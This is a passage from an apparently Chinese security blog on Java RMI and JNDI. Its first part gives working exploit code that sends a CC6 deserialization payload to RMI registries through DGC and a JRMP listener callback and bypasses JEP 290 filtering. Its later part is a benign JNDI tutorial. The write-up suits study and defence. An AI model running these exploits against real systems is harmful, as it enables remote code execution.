class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.internal.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.networking.RMIRegistryEndpoint;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.utils.RemoteObjectWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.dem0.rmi.Main.sendRawCall;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackByDGC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">attackRegister</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">2</span>);</span><br><span class="line">        sendRawCall(registryHost, registryPort,  objID, <span class="number">0</span>, -<span class="number">669196253586618813L</span>,payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">attackServer</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">        <span class="type">RMIRegistryEndpoint</span> <span class="variable">rmiRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIRegistryEndpoint</span>(<span class="string">&quot;192.168.111.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObjectWrapper</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectWrapper</span>(rmiRegistry.lookup(<span class="string">&quot;math&quot;</span>),<span class="string">&quot;math&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">2</span>);</span><br><span class="line">        sendRawCall(remoteObj.getHost(), remoteObj.getPort(),  objID, <span class="number">0</span>, -<span class="number">669196253586618813L</span>,payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        attackRegister();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="异常处理-JRMP协议"><a href="#异常处理-JRMP协议" class="headerlink" title="异常处理(JRMP协议)"></a>异常处理(JRMP协议)</h5><p>在客户端的<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>控制一手var1，就可以了。</p><p><img src="https://img.dem0dem0.top/images/image-20220503145939667.png" alt="image-20220503145939667"></p><p><code>JRMPListener</code>利用就是这里的问题，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doCall</span> <span class="params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">               <span class="keyword">if</span> ( <span class="string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                   <span class="keyword">return</span> ObjID[].class;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                   <span class="keyword">return</span> ObjID.class;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                   <span class="keyword">return</span> UID.class;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Not allowed to read object&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ObjID read;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           read = ObjID.read(ois);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> ( java.io.IOException e ) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ( read.hashCode() == <span class="number">2</span> ) &#123;</span><br><span class="line">           ois.readInt(); <span class="comment">// method</span></span><br><span class="line">           ois.readLong(); <span class="comment">// hash</span></span><br><span class="line">           System.err.println(<span class="string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       System.err.println(<span class="string">&quot;Sending return with payload for obj &quot;</span> + read);</span><br><span class="line"></span><br><span class="line">       out.writeByte(TransportConstants.Return);<span class="comment">// transport op ==&gt; 81</span></span><br><span class="line">       <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="built_in">this</span>.classpathUrl);</span><br><span class="line"></span><br><span class="line">       oos.writeByte(TransportConstants.ExceptionalReturn); <span class="comment">// transport var1 ==&gt; 2</span></span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">UID</span>().write(oos);</span><br><span class="line"></span><br><span class="line">       <span class="type">BadAttributeValueExpException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">       Reflections.setFieldValue(ex, <span class="string">&quot;val&quot;</span>, payload);</span><br><span class="line">       oos.writeObject(ex);</span><br><span class="line"></span><br><span class="line">       oos.flush();</span><br><span class="line">       out.flush();</span><br><span class="line"></span><br><span class="line">       <span class="built_in">this</span>.hadConnection = <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">synchronized</span> ( <span class="built_in">this</span>.waitLock ) &#123;</span><br><span class="line">           <span class="built_in">this</span>.waitLock.notifyAll();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>这是因为JEP 290只是在JRMP之上的反序列化过程中注入了Filter，而在JRMP层对错误的处理没有进行反序列化过滤。</code>.</p><p>最后在eki师傅的文章中，想到了server和register的通信中<code>DGC</code>的通信也是基于JRMP，所以同样可以使用。原理同上</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.dem0.rmi.Main.sendRawCall;</span><br><span class="line"><span class="comment">//import static com.dem0.util.Reflections.getFieldValue;</span></span><br><span class="line"><span class="comment">//import static com.dem0.util.Reflections.setFieldValue;</span></span><br><span class="line"><span class="keyword">import</span> com.dem0.utils.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryByJRMPListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">JRMPHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">JRMPPort</span> <span class="operator">=</span> <span class="number">2499</span>;</span><br><span class="line"></span><br><span class="line">            Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//因为UnicastRemoteObject的默认构造方式是protect的，所以需要反射调用</span></span><br><span class="line"></span><br><span class="line">            <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> (TCPEndpoint) Reflections.getFieldValue(Reflections.getFieldValue(Reflections.getFieldValue(remoteObject,<span class="string">&quot;ref&quot;</span>),<span class="string">&quot;ref&quot;</span>),<span class="string">&quot;ep&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//这里直接反射修改对应的值，间接修改构造的序列化数据</span></span><br><span class="line">            Reflections.setFieldValue(ep,<span class="string">&quot;port&quot;</span>,JRMPPort);</span><br><span class="line">            Reflections.setFieldValue(ep,<span class="string">&quot;host&quot;</span>,JRMPHost);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">ObjID</span> <span class="variable">objID_</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Bind(&quot;test&quot;,payloadObj)</span></span><br><span class="line">            sendRawCall(registryHost,registryPort,objID_,<span class="number">0</span>,<span class="number">4905912898345647071L</span>,<span class="string">&quot;test&quot;</span>,remoteObject);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了bypass上面这个过程，上面这个是在已经开始DGC请求的时候触发的，在高版本中orace也对这个进行了修复，所以要利用也就变得难上加难。但是为什么我们在第一次<code>readobject</code>的时候就进行呢？所以有了下面这个触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.internal.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.dem0.utils.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TriggerJRMPCallByDeserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;192.168.59.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JRMPHost</span> <span class="operator">=</span> <span class="string">&quot;192.168.59.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">JRMPPort</span> <span class="operator">=</span> <span class="number">2499</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(JRMPHost, JRMPPort);</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">refObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发关键在于RemoteObjectInvocationHandler的invoke方法</span></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">myInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(refObject);</span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">handcraftedSSF</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; RMIServerSocketFactory.class, java.rmi.Remote.class &#125;,</span><br><span class="line">                myInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(remoteObject, <span class="string">&quot;ssf&quot;</span>, handcraftedSSF);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serializeData =  ReflectUtils.WriteObjectToBytes(remoteObject);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.readObjectFromBytes(serializeData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是为了触发<code>RemoteObjectInvocationHandler</code>的invoke方法。</p><p>大概的流程就是<code>UnicastRemoteObject#readObject</code>&#x3D;&#x3D;&gt;<code>UnicastRemoteObject#reexport</code>&#x3D;&#x3D;&gt;<code>export</code>&#x3D;&#x3D;&gt;</p><p><img src="https://img.dem0dem0.top/images/image-20220503215649514.png" alt="image-20220503215649514"></p><p>剩下的就跟过去了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invokeRemoteMethod:<span class="number">223</span>, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">invoke:<span class="number">179</span>, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">createServerSocket:-<span class="number">1</span>, $Proxy2 (com.sun.proxy)</span><br><span class="line">newServerSocket:<span class="number">666</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">listen:<span class="number">335</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">254</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">411</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">147</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">exportObject:<span class="number">236</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">exportObject:<span class="number">383</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">exportObject:<span class="number">346</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">reexport:<span class="number">268</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">readObject:<span class="number">235</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">431</span>, ObjectInputStream (java.io)</span><br><span class="line">readObjectFromBytes:<span class="number">108</span>, ReflectUtils (com.dem0.internal)</span><br><span class="line">main:<span class="number">45</span>, TriggerJRMPCallByDeserialize (com.dem0.vuln)</span><br></pre></td></tr></table></figure><p>jdk8u241，在调用<code>UnicastRef.invoke</code>之前，做了一个检测。</p><h3 id="总结-EKI"><a href="#总结-EKI" class="headerlink" title="总结(EKI!!!)"></a>总结(EKI!!!)</h3><p><img src="https://img.dem0dem0.top/images/image-20220503220609196.png" alt="image-20220503220609196"></p><h2 id="0x02-JNDI"><a href="#0x02-JNDI" class="headerlink" title="0x02 JNDI"></a>0x02 JNDI</h2><blockquote><p>JNDI: JAVA名称和目录接口。<code>JNDI(Java Naming and Directory Interface)</code>是java提供的命名和目录服务，java可以通过他的API来命令和定位资源。可以访问的资源有:<code>DataSource(JDBC 数据源)</code>，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code></p></blockquote><ul><li><p>Naming</p><p>名称，实际上就是通过名称查找实际对象的服务。举个例子</p><blockquote><ul><li>DNS: 通过域名查找ip地址</li><li>QQ: 通过QQ号找到你这个用户</li><li>…..</li></ul></blockquote><p>这里就不得不提另外一个服务叫<code>LDAP</code>,是一个轻量级的目录访问服务。详情可以参考:<a href="https://paper.seebug.org/1091/#ldap%E3%80%82%E6%88%91%E4%BB%AC%E7%BB%A7%E7%BB%AD%E4%BB%8B%E7%BB%8DNaming">https://paper.seebug.org/1091/#ldap。我们继续介绍Naming</a>.</p><p>在名称系统中，有几个重要的概念。</p><ul><li><strong>Bindings</strong>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name（<code>HashMap(key=value)</code>)</li><li><strong>Context</strong>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext)。(<code>二叉树的根节点或者子节点</code>)</li><li><strong>References</strong>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以<code>引用(ref)</code>的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li></ul></li><li><p>Directory</p><p>   目录服务是对于命名服务的一个拓展，除了<code>Naming</code>中已经有的(<code>name==&gt;value</code>)，之外，还给对象拥有了<code>attributes</code>,由此我们不仅可以通过name去搜索对象，还可以根据属性去搜索对象。</p><p>   以打印机服务为例，我们可以在命名服务中根据打印机名称去获取打印机对象(引用)，然后进行打印操作；同时打印机拥有速率、分辨率、颜色等<strong>属性</strong>，作为目录服务，用户可以根据打印机的分辨率去搜索对应的打印机对象。</p><p>   常见服务:</p><ul><li>LDAP:上面已经说过。</li><li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li><li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li></ul><p>   总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。</p></li><li><p>Interface</p><p>JAVA为了方便使用上述的目录服务，实现了<code>JNDI</code>。从理解上,JNDI本身不是某一类特定的目录服务，所以可以针对不同的服务提供统一操作接口。</p><p><code>JNDI</code>的架构主要是两层，应用层接口和SPI。</p><p><img src="https://img.dem0dem0.top/images/ac18342889f64a129ffa97152e54b3b8.png" alt="jndi"><br>JNDI 接口主要分为下述 5 个包:</p><ul><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming</a>（命名操作）</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory</a>(目录操作)</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event</a>(请求事件通知)</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi</a>(允许动态插入不同实现，理解成为使JNDI能够访问自己定义的服务)</li></ul><h3 id="new-Quick-Start"><a href="#new-Quick-Start" class="headerlink" title=":new:Quick Start"></a>:new:Quick Start</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.Attributes;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DNSContextFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建环境变量对象</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        <span class="comment">//设置JNDI初始化工厂累名</span></span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        <span class="comment">//设置JNDI提供服务的URL地址</span></span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;dns://223.6.6.6/&quot;</span>);</span><br><span class="line">        <span class="comment">//创建JNDI目录服务对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DirContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">            <span class="comment">//获取DNS解析记录测试</span></span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">attrs1</span> <span class="operator">=</span> context.getAttributes(<span class="string">&quot;baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">attrs2</span> <span class="operator">=</span> context.getAttributes(<span class="string">&quot;dem0dem0.top&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">            System.out.println(attrs1);</span><br><span class="line">            System.out.println(attrs2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细的解释已经在代码中标注，这里不再赘述。跟进代码看看。很明显重点的代码在<code>DirContext context = new InitialDirContext(env);</code>.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//跟进到最后javax.naming.spi.NamingManager.getInitialContext(Hashtable&lt;?,?&gt; env)</span></span><br><span class="line"><span class="type">InitialContextFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getInitialContextFactoryBuilder();</span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> env != <span class="literal">null</span> ?(String)env.get(Context.INITIAL_CONTEXT_FACTORY) : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//builder为null ==&gt; factory = (InitialContextFactory)helper.loadClass(className).newInstance();</span></span><br><span class="line">factory = builder.createInitialContextFactory(env);</span><br><span class="line"><span class="keyword">return</span> factory.getInitialContext(env);</span><br></pre></td></tr></table></figure><p>首先是<code>getInitialContextFactoryBuilder</code>去拿能够创建factory的<code>builder</code>。只有当这个builder没有被初始化的时候，才会去加载<code>Context.INITIAL_CONTEXT_FACTORY</code>,然后调用他的<code>getInitialContext</code>。</p><p>到这里让我们用JNDI来重写一下RMI。(这里也就能理解reg,server,client)</p><p>首先还是要新建Registery</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure><p>然后是server端来获取reg对象绑定对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            initialContext.bind(<span class="string">&quot;calc&quot;</span>,calc);</span><br><span class="line">            System.out.println(<span class="string">&quot;calc bindings&quot;</span>);</span><br><span class="line">            initialContext.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>然后是client获取reg对象拿实例对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            <span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> (ICalc) initialContext.lookup(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            initialContext.close();</span><br><span class="line">            List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            li.add(<span class="number">1</span>);</span><br><span class="line">            li.add(<span class="number">2</span>);</span><br><span class="line">            System.out.println(calc.sum(li));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        